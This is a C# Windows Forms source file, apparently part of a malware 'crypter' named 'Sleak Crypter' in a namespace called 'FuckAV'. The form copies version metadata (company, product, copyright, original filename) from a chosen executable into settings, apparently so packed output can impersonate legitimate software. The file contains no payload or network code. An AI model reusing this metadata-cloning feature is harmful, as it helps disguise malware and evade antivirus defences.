using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace FuckAV.Forms
{
    public partial class Assembly : Form
    {
        public Assembly()
        {
            InitializeComponent();
        }

        private void siticoneButton1_Click(object sender, EventArgs e)
        {
            try
            {
                if (checkBox1.Checked)
                {
                    string filename = null;
                    using (var openFileDialog = new OpenFileDialog())
                    {
                        openFileDialog.Filter = "Executable (*.exe)|*.exe";
                        if (openFileDialog.ShowDialog() == DialogResult.OK)
                        {
                            filename = openFileDialog.FileName;
                            var fileVersionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);

                            txtOriginalFilename.Text = fileVersionInfo.InternalName;
                            txtDescription.Text = fileVersionInfo.FileDescription;
                            txtCompany.Text = fileVersionInfo.CompanyName;
                            txtProduct.Text = fileVersionInfo.ProductName;
                            txtCopyright.Text = fileVersionInfo.LegalCopyright;
                            txtTrademarks.Text = fileVersionInfo.LegalTrademarks;

                            var version = fileVersionInfo.FileMajorPart;
                            txtFileVersion.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
                            txtProductVersion.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
                        }
                    }
                    try
                    {
                        Properties.Settings.Default["WriteAssembly"] = true;
                        Properties.Settings.Default["Product"] = txtProduct.Text;
                        Properties.Settings.Default["Description"] = txtDescription.Text;
                        Properties.Settings.Default["Company"] = txtCompany.Text;
                        Properties.Settings.Default["Copyright"] = txtCopyright.Text;
                        Properties.Settings.Default["Trademark"] = txtTrademarks.Text;
                        Properties.Settings.Default["OriginalFilename"] = txtOriginalFilename.Text;
                        Properties.Settings.Default["ProductVersion"] = txtProductVersion.Text;
                        Properties.Settings.Default["FileVersion"] = txtFileVersion.Text;

                        Properties.Settings.Default.Save();
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex);
                    }
                }
                else
                {
                    MessageBox.Show("Please Enable this feature !", "Sleak Crypter", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }


            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

        private void siticoneButton1_Click_1(object sender, EventArgs e)
        {
            Hide();
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {

        }
    }
}
